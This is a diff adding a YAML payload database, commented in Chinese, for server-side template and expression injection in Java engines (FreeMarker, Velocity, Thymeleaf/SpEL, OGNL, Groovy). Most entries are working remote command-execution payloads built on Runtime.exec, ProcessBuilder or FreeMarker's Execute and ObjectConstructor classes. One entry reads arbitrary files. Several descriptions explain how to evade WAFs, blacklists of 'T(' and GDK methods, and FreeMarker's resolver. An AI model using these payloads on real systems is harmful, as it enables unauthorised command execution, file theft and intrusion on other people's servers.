@@ -1,0 +1,200 @@
+ruleDB: v0.1.0
+# Java 系模板 / 表达式注入：Freemarker、Velocity、Thymeleaf、SpEL、OGNL。
+# 全部无可靠 parser，运行期一律标注「未校验」。
+
+templates:
+  - id: ssti.java.freemarker.execute
+    name: Freemarker Execute 命令执行
+    desc: 用 Freemarker 内置的 Execute 工具类，无需额外依赖
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [freemarker]
+    version: ">=2.3.0"
+    body: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("<<cmd>>")}'
+    vars: [cmd]
+    requires: [template-ctrl, weak-hardening]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.java.freemarker.file.read
+    name: Freemarker 读文件
+    desc: 只想读文件、不打算执行任意命令时用，走 Freemarker 自带的 Execute 工具类。命令固定成 cat，目标上得有 cat（Windows 目标要改成 type）
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [freemarker]
+    version: ">=2.3.0"
+    body: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat <<filepath>>")}'
+    vars: [filepath]
+    requires: [template-ctrl]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssti.java.velocity.runtime
+    name: Velocity Runtime 命令执行
+    desc: Velocity 通过反射拿到 java.lang.Runtime
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [velocity]
+    version: "*"
+    body: "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('<<cmd>>'))$ex.waitFor()"
+    vars: [cmd]
+    requires: [template-ctrl]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.java.thymeleaf.spel
+    name: Thymeleaf / SpEL 命令执行
+    desc: Thymeleaf 表达式里用 SpEL 的 T() 取类型
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [thymeleaf, spring]
+    version: "*"
+    body: "${T(java.lang.Runtime).getRuntime().exec(\"<<cmd>>\")}"
+    vars: [cmd]
+    requires: [template-ctrl, weak-hardening]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.java.ognl.runtime
+    name: OGNL Runtime 命令执行
+    desc: Struts2 等用 OGNL 的场景
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [struts2]
+    version: "*"
+    body: "%{@java.lang.Runtime@getRuntime().exec(\"<<cmd>>\")}"
+    vars: [cmd]
+    requires: [template-ctrl]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.java.groovy.rce
+    name: Groovy 命令执行
+    desc: Groovy 的 GString 里 ${ } 求值，String.execute() 是 GDK 方法
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [groovy]
+    version: "*"
+    body: "${'<<cmd>>'.execute().text}"
+    vars: [cmd]
+    requires: [template-ctrl]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.java.thymeleaf.preprocess
+    name: Thymeleaf 预处理表达式命令执行
+    desc: Spring 里视图名由用户可控时走这条（__${...}__::.x 先做预处理求值，再当视图名解析）。Thymeleaf 3.0.12 / Spring Boot 2.3 之后默认关闭了预处理
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [thymeleaf, spring]
+    version: "<3.0.12"
+    body: "__${T(java.lang.Runtime).getRuntime().exec(\"<<cmd>>\")}__::.x"
+    vars: [cmd]
+    requires: [template-ctrl, weak-hardening]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssti.java.velocity.inspect
+    name: Velocity 经 class.inspect 命令执行
+    desc: VelocityTools 的 `$class` 被放进上下文时（多数 Spring + Velocity 的集成默认就有）用这条——`inspect()` 能拿到任意类的 Class 对象，再反射调 Runtime。**先发一个裸 `$class` 确认它有没有被求值**：输出字面量 `$class` 说明上下文里没有它，这条和 `$class.inspect` 以外的几条 Velocity 载荷都不成立
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [velocity]
+    version: "*"
+    body: '#set($e=$class.inspect("java.lang.Runtime").type.getRuntime().exec("<<cmd>>"))$e.waitFor()'
+    vars: [cmd]
+    requires: [template-ctrl, weak-hardening]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssti.java.spel.forname
+    name: SpEL 经 Class.forName（T() 被禁时）
+    desc: 过滤把 `T(` 拉黑时用：SpEL 允许在一个**实例**上调用静态方法，所以先 `''.getClass()` 拿到 Class，再用它 `forName()` 取 Runtime——整条载荷里没有 `T(`。它和 `ssti.java.thymeleaf.spel` 的适用面一样（都要真 SpEL 求值），区别只在过滤条件。Spring 的 SimpleEvaluationContext 会一并禁掉类型引用与方法调用，那种配置下两条都失效
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [thymeleaf, spring]
+    version: "*"
+    body: "${''.getClass().forName('java.lang.Runtime').getRuntime().exec('<<cmd>>')}"
+    vars: [cmd]
+    requires: [template-ctrl, weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssti.java.spel.new
+    name: SpEL 经 new ProcessBuilder 命令执行
+    desc: 另一条不靠 `T()` 的 SpEL 路径：`new` 直接实例化 ProcessBuilder，比 `Runtime.exec` 少一层反射，很多只挡 `T(` 和 `getRuntime` 的规则漏掉它。命令是**数组形式**的，`/bin/sh -c` 那层不能省——否则带管道、重定向的整条命令会被拆错；Windows 目标把数组换成 `{"cmd.exe","/c","..."}`
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [thymeleaf, spring]
+    version: "*"
+    body: "${new java.lang.ProcessBuilder(new String[]{\"/bin/sh\",\"-c\",\"<<cmd>>\"}).start()}"
+    vars: [cmd]
+    requires: [template-ctrl, weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssti.java.freemarker.object_constructor
+    name: Freemarker 经 ObjectConstructor 命令执行
+    desc: Execute 那个类名被拦（或 `?new` 的白名单里只放行了别的类）时换它：`ObjectConstructor` 能按类名 + 参数直接 new 一个对象，拿 ProcessBuilder 起进程。两条都依赖 `?new`，真正被禁的只是**类名字符串黑名单**，换个类名就能过——所以 FreeMarker 2.3.17 起默认的 SAFER_RESOLVER（拉黑 Execute / ObjectConstructor / JythonRuntime 三个）才是关键，`weak-hardening` 说的就是它没被换成更严的 resolver。这条**不回显**命令输出
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [freemarker]
+    version: ">=2.3.0"
+    body: '<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>${oc("java.lang.ProcessBuilder","<<cmd>>").start()}'
+    vars: [cmd]
+    requires: [template-ctrl, weak-hardening]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssti.java.groovy.processbuilder
+    name: Groovy 经 ProcessBuilder 命令执行
+    desc: 目标用 Groovy 的 SecureASTCustomizer 把 GDK 方法（`String.execute()`）拉黑时用这条——它不用 GDK，直接 `new ProcessBuilder` 再读回输出。命令用**数组**给，所以 `/bin/sh -c` 那层不能省，否则带管道和重定向的命令会被拆错。它和 `${'cmd'.execute().text}` 那条的适用面相同，选哪条只看过滤拦的是 GDK 方法名还是 `ProcessBuilder` 类名
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [groovy]
+    version: "*"
+    body: |-
+      ${new java.lang.ProcessBuilder(["/bin/sh","-c","<<cmd>>"]).start().inputStream.text}
+    vars: [cmd]
+    requires: [template-ctrl]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssti.java.thymeleaf.inline
+    name: Thymeleaf 内联表达式命令执行
+    desc: 输入落在**文本位置**而不是表达式/属性位置时用（页面开了 `th:inline="text"` 或 `th:inline="javascript"` 的区域，输入被当成模板文本拼进去）。`[[${...}]]` 是 Thymeleaf 的内联表达式语法，走的还是同一套 SpEL 求值，但不少 WAF 只盯着 `${` 和 `__${` 这两个开头。整段模板内容本身可控时，直接用 `ssti.java.thymeleaf.spel` 那条更省事
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [thymeleaf, spring]
+    version: "*"
+    body: '[[${T(java.lang.Runtime).getRuntime().exec("<<cmd>>")}]]'
+    vars: [cmd]
+    requires: [template-ctrl, weak-hardening]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
